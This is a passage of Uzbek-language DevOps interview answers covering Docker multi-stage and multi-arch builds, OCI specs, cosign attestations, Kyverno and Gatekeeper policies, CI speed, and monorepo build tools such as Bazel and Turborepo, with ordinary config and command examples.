**Qisqa javob:** Layer squashing — image'ning barcha (yoki bir nechta) layer'larini bitta layer'ga birlashtirish. Foyda: oldingi layer'da yaratilib keyin o'chirilgan fayllar (build tool, cache, secret!) haqiqatan yo'qoladi va hajm kamayadi. Zarar: layer cache va registry'da layer'larni qayta ishlatish yo'qoladi. Bugun odatda **multi-stage build** afzal.

**Muammo:** Har `RUN`/`COPY` alohida layer. `RUN rm -rf /tmp/build` faylni faqat yuqori layer'da "whiteout" bilan yashiradi — pastki layer'da u baribir bor va image hajmini oshiradi (`docker save` bilan olinishi ham mumkin).

**Qanday ishlaydi:**
```text
oddiy:   L1 base | L2 +500MB toolchain | L3 build | L4 rm toolchain (whiteout)  -> 700MB
squash:  L1 base | L2 (L2+L3+L4 natijasi)                                      -> 200MB
multi-stage: stage "build" (toolchain) --COPY --from=build /app--> stage "final" (distroless) -> 30MB
```

**Amalda:**
```dockerfile
FROM golang:1.23 AS build
WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 go build -o /app ./cmd/api

FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=build /app /app
ENTRYPOINT ["/app"]
```
```bash
docker history org/api:1.5.0          # layer'lar va hajmlari
dive org/api:1.5.0                    # isrof qilingan joyni ko'rish
docker build --squash .               # eski, experimental (classic builder), BuildKit'da qo'llanmaydi
```

**Tuzoqlar:**
- Secret'ni `COPY` qilib keyin `rm` — u baribir layer tarixida. BuildKit `--mount=type=secret` ishlat.
- Squash qilingan image — har versiyada butun layer qayta push/pull bo'ladi, base image ham ulashilmaydi.
- `--squash` BuildKit/buildx'da yo'q — eski maqolalarga ishonma.

**Senior nuqta:** To'g'ri tartib: multi-stage + minimal final base (distroless/chainguard/alpine) + o'zgarmas narsalarni (dependency) yuqori layer'larga, tez o'zgaradigan kodni pastga. Bu ham kichik image, ham yaxshi cache beradi.

40709.a:
**Qisqa javob:** Multi-arch build — bitta Dockerfile'dan bir nechta platforma (`linux/amd64`, `linux/arm64`, ...) uchun image'lar yaratib, ularni bitta tag ostida **manifest list (OCI image index)** sifatida push qilish. `docker pull` qilganda runtime o'z arxitekturasiga mos variantni avtomatik tanlaydi.

**Muammo:** Graviton/Ampere (arm64) node'lar arzonroq, developer'lar Apple Silicon'da; amd64-only image arm64 node'da `exec format error` beradi.

**Qanday ishlaydi:**
```text
org/api:1.5.0 (index)
  +-- linux/amd64 -> manifest sha256:aaa (layers)
  +-- linux/arm64 -> manifest sha256:bbb (layers)
build usullari:
  - QEMU emulyatsiya (sodda, lekin 5-20x sekin)
  - cross-compile (Go/Rust: GOARCH bilan, tez)
  - native builder node'lar (har arxitektura o'z mashinasida)
```

**Amalda:**
```bash
docker buildx create --use --name multi
docker buildx build --platform linux/amd64,linux/arm64 -t ghcr.io/org/api:1.5.0 --push .
docker buildx imagetools inspect ghcr.io/org/api:1.5.0
```
Cross-compile bilan tezlashtirish:
```dockerfile
FROM --platform=$BUILDPLATFORM golang:1.23 AS build
ARG TARGETOS TARGETARCH
WORKDIR /src
COPY . .
RUN GOOS=$TARGETOS GOARCH=$TARGETARCH CGO_ENABLED=0 go build -o /app ./cmd/api
FROM gcr.io/distroless/static-debian12
COPY --from=build /app /app
ENTRYPOINT ["/app"]
```

**Tuzoqlar:**
- QEMU bilan og'ir build (C extension, npm native modul) — CI 40+ daqiqa. Native arm64 runner'lar (GitHub `ubuntu-24.04-arm`) yoki cross-compile.
- `--load` bilan multi-platform image'ni lokal Docker'ga yuklab bo'lmaydi (containerd image store yoqilmagan bo'lsa) — `--push` kerak.
- Base image barcha platformani qo'llamasa build yiqiladi; har platformada test ham qil.

**Senior nuqta:** Imzolash va SBOM'ni index darajasida va har platforma manifest'i uchun qil; admission policy digest bo'yicha tekshirganda index digest'i ishlatilishini bil.

40710.a:
**Qisqa javob:** OCI (Open Container Initiative, Linux Foundation, 2015) — container'lar uchun ochiq standartlar: **Image Spec** (manifest, config, layer formati, image index), **Runtime Spec** (container'ni qanday ishga tushirish — `config.json` + rootfs bundle; reference: runc) va **Distribution Spec** (registry HTTP API: push/pull). Bu Docker, Podman, containerd, CRI-O, BuildKit, Kaniko, registry'larning o'zaro mosligini ta'minlaydi.

**Muammo:** Standart bo'lmasa har tool o'z formatiga bog'lanadi: Podman'da build qilingan image containerd'da ishlamasligi mumkin edi.

**Qanday ishlaydi:**
```text
build tool (BuildKit, Kaniko, Buildah) --Image Spec--> image
   --Distribution Spec (HTTP API)--> registry (Harbor, ECR, GHCR)
   --pull--> containerd/CRI-O --unpack--> bundle --Runtime Spec--> runc/crun/gVisor/kata
```
Image Spec v1.1 (2024): `artifactType` va `subject` maydonlari — imzo, SBOM, attestation'larni image'ga "referrer" sifatida bog'lash (Referrers API).

**Amalda:**
```bash
crane manifest ghcr.io/org/api:1.5.0 | jq .mediaType   # application/vnd.oci.image.index.v1+json
oras push ghcr.io/org/artifacts:sbom sbom.json:application/spdx+json   # istalgan artifact
oras discover ghcr.io/org/api@sha256:...               # bog'langan imzo/SBOM'lar
skopeo copy docker://ghcr.io/org/api:1.5.0 oci:./api-oci  # OCI layout'ga
```

**Tuzoqlar:**
- Docker v2 manifest va OCI manifest — o'xshash, lekin media type'lari farq qiladi; eski registry'lar OCI index/artifact'larni qo'llamasligi mumkin.
- "OCI image" = "Docker image" deb hisoblash odatda to'g'ri, lekin Docker'ga xos maydonlar (HEALTHCHECK) OCI config'da yo'q.
- Registry Referrers API'ni qo'llamasa, cosign tag-asosidagi fallback (`sha256-<digest>.sig`) ishlatadi.

**Senior nuqta:** OCI registry endi universal artifact ombori: Helm chart (OCI), Flux manifest'lari (OCIRepository), WASM modullar, SBOM, imzolar. Bu supply chain'ni bitta registry va bitta access control atrofida birlashtirishga imkon beradi.

40711.a:
**Qisqa javob:** Cosign attestation — image digest'iga bog'langan, imzolangan in-toto **statement**: "bu image haqida X da'vo qilinadi" (predicate: SBOM, SLSA provenance, vuln scan natijasi, test natijasi, custom). Oddiy imzo "kim imzoladi"ni, attestation esa "image haqida nima ma'lum"ni isbotlaydi.

**Muammo:** Admission policy faqat "imzolanganmi?" deb so'rasa yetmaydi. "SBOM bormi? Critical CVE yo'qmi? Bizning CI'da, main branch'dan build qilinganmi?" — bularni tekshirish uchun imzolangan metadata kerak.

**Qanday ishlaydi:**
```text
predicate (sbom.json) --> in-toto Statement {subject: image digest, predicateType, predicate}
   --> DSSE envelope + imzo (keyless) --> registry (referrer / .att tag) + Rekor
verify-attestation --> imzo ok? identity ok? predicate policy (CUE/Rego) ok?
```

**Amalda:**
```bash
IMG=ghcr.io/org/api@sha256:abc...
cosign attest --yes --type cyclonedx --predicate sbom.cdx.json $IMG
cosign attest --yes --type slsaprovenance1 --predicate provenance.json $IMG
cosign attest --yes --type vuln --predicate grype.json $IMG

cosign verify-attestation --type cyclonedx \
  --certificate-identity-regexp '^https://github.com/org/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  $IMG | jq -r .payload | base64 -d | jq .predicateType
```
Kyverno'da: `verifyImages[].attestations[]` bilan `predicateType` va shartlar (masalan scan natijasida `critical == 0`).

**Tuzoqlar:**
- Attestation build'dan alohida (boshqa job, boshqa identity) qilinsa — kim yaratganini aniq tekshir; aks holda har kim "toza scan" attestation qo'sha oladi.
- Vuln scan attestation vaqt o'tishi bilan eskiradi — yangi CVE chiqadi. Policy'da attestation yoshini tekshir.
- Tag'ga attestation qilish — digest ishlat.

**Senior nuqta:** Attestation'lar zanjiri (provenance + SBOM + scan) va admission'da ularni tekshirish — SLSA'ni "hujjat"dan "majburiy nazorat"ga aylantiradi. GitHub `actions/attest-*` va `gh attestation verify` xuddi shu formatni ishlatadi.

40712.a:
**Qisqa javob:** Kyverno'da `ClusterPolicy` — cluster-scoped resurs, butun klasterdagi (barcha namespace va cluster-scoped resurslar) obyektlarga qo'llanadi; `Policy` — namespaced resurs, faqat o'zi turgan namespace'dagi resurslarga ta'sir qiladi. Qoidalar sintaksisi bir xil.

**Muammo:** Platform jamoa butun klaster uchun majburiy qoidalar (privileged taqiq, imzolangan image) o'rnatadi; ilova jamoasi esa o'z namespace'ida qo'shimcha qoida xohlaydi — lekin boshqalarga ta'sir qilmasligi kerak.

**Qanday ishlaydi:**

| | ClusterPolicy | Policy |
|---|---|---|
| Scope | Klaster | Bitta namespace |
| Kim yaratadi (RBAC) | Platform/cluster-admin | Namespace egasi (agar ruxsat berilsa) |
| Cluster-scoped resurslar (Namespace, ClusterRole) | Ha | Yo'q |
| `generate` boshqa namespace'ga | Ha | Faqat o'z namespace'iga |

**Amalda:**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: { name: disallow-privileged }
spec:
  validationFailureAction: Enforce
  rules:
    - name: no-privileged
      match: { any: [{ resources: { kinds: [Pod] } }] }
      exclude: { any: [{ resources: { namespaces: [kube-system] } }] }
      validate:
        message: "privileged container taqiqlangan"
        pattern:
          spec:
            containers:
              - =(securityContext):
                  =(privileged): "false"
---
apiVersion: kyverno.io/v1
kind: Policy
metadata: { name: require-team-label, namespace: payments }
spec:
  validationFailureAction: Audit
  rules:
    - name: team-label
      match: { any: [{ resources: { kinds: [Deployment] } }] }
      validate: { message: "team label kerak", pattern: { metadata: { labels: { team: "?*" } } } }
```
```bash
kubectl get cpol,pol -A
kubectl get policyreport -n payments
```

**Tuzoqlar:**
- Namespace egasiga `Policy` yaratish ruxsatini berish — u o'z `Policy`si bilan ClusterPolicy'ni bekor qila olmaydi, lekin `mutate` bilan resurslarni kutilmagan tarzda o'zgartirishi mumkin.
- ClusterPolicy'da `exclude` qilmaslik — system namespace'lar bloklanadi.
- Kyverno 1.13+ da `ValidatingPolicy` va boshqa yangi CEL-asosli turlar ham bor — versiyaga qarab tanla.

**Senior nuqta:** Asosiy guardrail'lar — ClusterPolicy'da va Git'da (GitOps), namespace Policy'lar — jamoalarning o'z qo'shimchalari. Har yangi ClusterPolicy avval `Audit`, PolicyReport'lar ko'rilgach `Enforce`.

40713.a:
**Qisqa javob:** OPA Gatekeeper'da `ConstraintTemplate` — yangi policy **turi**ni belgilaydigan CRD: ichida Rego logikasi va parametrlar sxemasi bor. Uni apply qilsang Gatekeeper yangi CRD yaratadi (masalan `K8sRequiredLabels`); shu turdagi **Constraint** resurslari esa qoidani aniq parametrlar va qamrov (`match`) bilan ishga tushiradi.

**Muammo:** Bir xil mantiq ("label majburiy") turli namespace'larda turli label'lar bilan kerak. Logikani bir marta yozib, ko'p marta parametr bilan ishlatish — template/instance ajratish.

**Qanday ishlaydi:**
```text
ConstraintTemplate (Rego + schema) --> CRD: K8sRequiredLabels
   Constraint A: kinds=[Namespace], labels=[owner]
   Constraint B: kinds=[Deployment], namespaces=[prod], labels=[team, tier]
admission request --> Gatekeeper --> mos Constraint'lar --> Rego violation? deny/warn/dryrun
audit: mavjud resurslarni davriy tekshirib status'ga yozadi
```

**Amalda:**
```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata: { name: k8srequiredlabels }
spec:
  crd:
    spec:
      names: { kind: K8sRequiredLabels }
      validation:
        openAPIV3Schema:
          type: object
          properties: { labels: { type: array, items: { type: string } } }
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredlabels
        violation[{"msg": msg}] {
          required := {l | l := input.parameters.labels[_]}
          provided := {l | input.review.object.metadata.labels[l]}
          missing := required - provided
          count(missing) > 0
          msg := sprintf("label yetishmaydi: %v", [missing])
        }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata: { name: ns-owner }
spec:
  enforcementAction: dryrun
  match: { kinds: [{ apiGroups: [""], kinds: [Namespace] }] }
  parameters: { labels: [owner] }
```
```bash
kubectl get constrainttemplates
kubectl get k8srequiredlabels ns-owner -o yaml   # status.violations (audit)
```

**Tuzoqlar:**
- Rego xatosi — template `status`da ko'rinadi, policy esa jim ishlamaydi. `gator test` bilan unit test yoz.
- `enforcementAction: deny` darhol — mavjud deploy'lar sinadi; `dryrun`/`warn` bilan boshla.
- Boshqa resurslarga qarash (`data.inventory`) uchun sync konfiguratsiyasi kerak — aks holda bo'sh.

**Senior nuqta:** Gatekeeper vs Kyverno: Gatekeeper — Rego, kuchli va umumiy (OPA'ni boshqa joyda ham ishlatasiz); Kyverno — YAML/CEL, o'rganish oson, mutate/generate/image verify ichida. Kubernetes'ning o'zida `ValidatingAdmissionPolicy` (CEL, GA 1.30) oddiy qoidalar uchun tashqi webhook'siz yechim.

40714.a:
**Qisqa javob:** CI feedback loop — developer push qilgandan to CI natijasini (yashil/qizil) olguncha ketgan vaqt. Maqsad odatda: PR check'lari **10 daqiqadan kam** (ideal 5), lokal testlar soniyalar. Sekin feedback — kontekst almashish, katta PR'lar va "CI'ni kutib o'tirmayman" madaniyati.

**Muammo:** 40 daqiqalik pipeline: developer boshqa vazifaga o'tadi, natija kelganda kontekst yo'qolgan; xato bo'lsa yana 40 daqiqa. Kuniga 3-4 iteratsiya — mahsuldorlik keskin tushadi.

**Qanday ishlaydi (qayerda vaqt ketadi):**
```text
queue (runner kutish) -> checkout -> dependency install -> build -> test -> scan -> report
   ^ runner yetishmasligi   ^ cache yo'q    ^ incremental yo'q  ^ ketma-ket, sekin testlar
```

**Amalda (tezlashtirish):**
```yaml
jobs:
  test:
    strategy: { matrix: { shard: [1, 2, 3, 4] } }   # testlarni bo'lish
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: { go-version-file: go.mod, cache: true }   # dependency/build cache
      - run: go test ./... -run "$(./scripts/shard.sh ${{ matrix.shard }} 4)"
  lint:            # test bilan parallel
    runs-on: ubuntu-latest
    steps: [ { uses: actions/checkout@v4 }, { run: make lint } ]
```
O'lchash: GitHub Actions usage/insights, `gh run list --json durationMs` yoki DORA/CI dashboard; p50 va p90'ni kuzat.

**Tuzoqlar:**
- Faqat o'rtachani ko'rish — p90 (eng sekin run'lar) developer tajribasini belgilaydi.
- Hamma narsani PR'da qilish (to'liq e2e, DAST) — sekin qismlarni main/nightly'ga ko'chir.
- Flaky testlar — retry vaqtni ikki baravar oshiradi.

**Senior nuqta:** Feedback loop qatlamli: IDE/pre-commit (soniya) -> PR CI (daqiqa) -> main/nightly (soat). Har tekshiruvni xatoni eng arzon ushlaydigan eng tez qatlamga joylashtir. CI vaqti — platforma jamoaning SLO'si bo'lishi kerak.

40715.a:
**Qisqa javob:** Monorepo incremental build — faqat o'zgargan fayllar va ularga **bog'liq** (dependency graph bo'yicha downstream) target'larni build/test qilish; qolganlari uchun avvalgi natija cache'dan olinadi. Asos: kirish (source, dependency, tool versiyasi) hash'i bir xil bo'lsa — natija ham bir xil.

**Muammo:** 200 paketli monorepo'da har PR'da hammasini build/test qilish — soatlar. Bitta README o'zgarishi uchun to'liq pipeline isrof.

**Qanday ishlaydi:**
```text
o'zgargan: libs/auth
graph:  libs/auth <- services/api <- apps/web
        libs/billing (o'zgarmagan)
affected = {libs/auth, services/api, apps/web}
har target: key = hash(inputs) -> cache hit? natijani olish : bajarish va cache'ga yozish
```

**Amalda:**
```bash
# Nx
npx nx affected -t test --base=origin/main --head=HEAD
# Turborepo
npx turbo run build test --filter='...[origin/main]'
# Bazel
bazel test //... --remote_cache=grpcs://cache.org.com   # cache hit'lar "cached" deb chiqadi
# Go (oddiy holat) - Go build cache o'zi incremental
go test ./...    # o'zgarmagan paketlar: "ok ... (cached)"
```
CI'da `fetch-depth: 0` kerak — base bilan solishtirish uchun tarix.

**Tuzoqlar:**
- Graph to'liq emas (yashirin dependency: umumiy config fayl, env var, codegen) — kerakli test ishlamaydi, xato main'ga tushadi. Input'larni aniq e'lon qil.
- Nondeterministik build (timestamp, random) — hash har safar boshqa, cache hech qachon ishlamaydi.
- Shared remote cache'ga har kim yozsa — cache poisoning; yozishni faqat ishonchli CI'ga ber.

**Senior nuqta:** Incremental build'ning ishonchliligi hermeticity'ga bog'liq. Nightly'da to'liq (cache'siz) build ishlatib, affected logikasi biror narsani o'tkazib yuborayotganini tekshirib tur.

40716.a:
**Qisqa javob:** Bazel — Google'ning (Blaze'dan) ochiq kodli build tizimi: ko'p tilli (Java, Go, C++, Python, JS ...), **hermetic** (build faqat e'lon qilingan input'larga bog'liq), **reproducible**, aniq dependency graph, remote caching va remote execution bilan katta monorepo'larni tez build qiladi. Build fayllari Starlark tilida (`BUILD.bazel`, `MODULE.bazel`).

**Muammo:** Minglab developer va millionlab qatorli monorepo'da `make`/til-maxsus tool'lar: build sekin, natija mashinaga bog'liq ("menda ishlaydi"), keraksiz qayta build.

**Qanday ishlaydi:**
```text
BUILD fayllar -> action graph (har action: input hash -> output)
   action key cache'da? (local / remote cache) -> natijani yuklab olish
   yo'q -> bajarish (lokal sandbox yoki remote execution klaster) -> cache'ga yozish
sandbox: action faqat e'lon qilingan fayllarni ko'radi -> yashirin dependency xato beradi
```

**Amalda:**
```python
# BUILD.bazel
load("@rules_go//go:def.bzl", "go_binary", "go_library", "go_test")
go_library(name = "auth", srcs = ["auth.go"], importpath = "org/libs/auth", deps = ["//libs/crypto"])
go_test(name = "auth_test", srcs = ["auth_test.go"], embed = [":auth"])
```
```bash
bazel build //services/api:api
bazel test //... --remote_cache=grpcs://cache.org.com
bazel query 'rdeps(//..., //libs/auth)'      # auth'ga kim bog'liq
bazel run //:gazelle                         # Go BUILD fayllarini avtomatik yaratish
```
`WORKSPACE` eskirgan — Bzlmod (`MODULE.bazel`) Bazel 7+ da default, 8 da WORKSPACE o'chirilgan.

**Tuzoqlar:**
- O'rganish va migratsiya narxi katta: har dependency'ni BUILD fayllarda e'lon qilish, ekotizim tool'lari bilan ziddiyat (go modules, npm).
- Kichik/o'rta loyihaga Bazel — ortiqcha murakkablik.
- Remote cache'siz Bazel'ning asosiy afzalligi yo'qoladi.

**Senior nuqta:** Bazel'ni tanlash — texnik emas, tashkiliy qaror: unga alohida build/platform jamoasi kerak. Yuzlab servis va ko'p tilli monorepo'da o'zini oqlaydi; aks holda til-native tool'lar + Nx/Turborepo yetarli.

40717.a:
**Qisqa javob:** Turborepo (Vercel) — JS/TS monorepo'lar uchun task runner: `package.json` workspace'laridan dependency graph quradi, task'larni (build, test, lint) to'g'ri tartibda va parallel bajaradi, natijalarni input hash bo'yicha lokal va **remote cache**'da saqlaydi. Rust'da yozilgan, sozlash minimal (`turbo.json`).

**Muammo:** npm/pnpm workspace'lar bilan 30 paketli monorepo'da `pnpm -r build` hammasini ketma-ket qayta build qiladi; CI har safar noldan.

**Qanday ishlaydi:**
```text
turbo run build
  graph: ui -> web, ui -> admin ("^build" = avval dependency'larning build'i)
  har task: hash(fayllar + env + dependency hash'lari) -> cache hit? log va outputs'ni tiklash
                                                       -> miss: bajarish, outputs'ni saqlash
```

**Amalda:**
```json
{
  "$schema": "https://turbo.build/schema.json",
  "tasks": {
    "build": { "dependsOn": ["^build"], "outputs": ["dist/**", ".next/**", "!.next/cache/**"] },
    "test":  { "dependsOn": ["build"], "outputs": [] },
    "lint":  {}
  },
  "globalEnv": ["NODE_ENV"]
}
```
```bash
npx turbo run build test
# >>> FULL TURBO (hammasi cache'dan)
npx turbo run test --filter=web...            # web va uning dependency'lari
npx turbo run build --filter='...[origin/main]'   # o'zgarganlar va ularga bog'liqlar
npx turbo login && npx turbo link             # Vercel remote cache (yoki self-hosted)
```

**Tuzoqlar:**
- `outputs` noto'g'ri yozilsa — cache hit bo'ladi, lekin `dist/` tiklanmaydi va keyingi task yiqiladi.
- Build'ga ta'sir qiluvchi env var'ni `env`/`globalEnv`ga qo'shmaslik — boshqa muhit uchun eski natija qaytadi (eng xavfli xato).
- Turborepo — task runner, bundler emas; Nx'dan farqli ravishda kod generatsiya va plugin ekotizimi kam.

**Senior nuqta:** Turborepo — "eng kam sozlash bilan tez foyda": mavjud workspace'ga qo'shib darhol cache olasan. Juda katta va ko'p tilli repo'da Nx yoki Bazel'ning kuchli graph va distributed execution imkoniyatlari kerak bo'lishi mumkin.

40718.a:
